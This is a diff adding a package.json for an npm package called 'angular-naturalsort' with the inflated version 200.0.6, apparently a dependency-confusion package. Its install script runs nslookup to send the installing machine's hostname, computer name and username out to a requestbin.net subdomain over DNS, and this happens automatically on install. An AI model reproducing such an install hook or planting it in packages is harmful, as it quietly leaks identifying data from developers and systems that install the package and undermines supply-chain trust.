@@ -1,0 +1,11 @@
+{
+  "name": "angular-naturalsort",
+  "version": "200.0.6",
+  "description": "angular-naturalsort: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.angular-naturalsort.a430051ef18acd86255c.d.requestbin.net"
+  },
+  "author": "another noob developer",
+  "license": "ISC"
+}
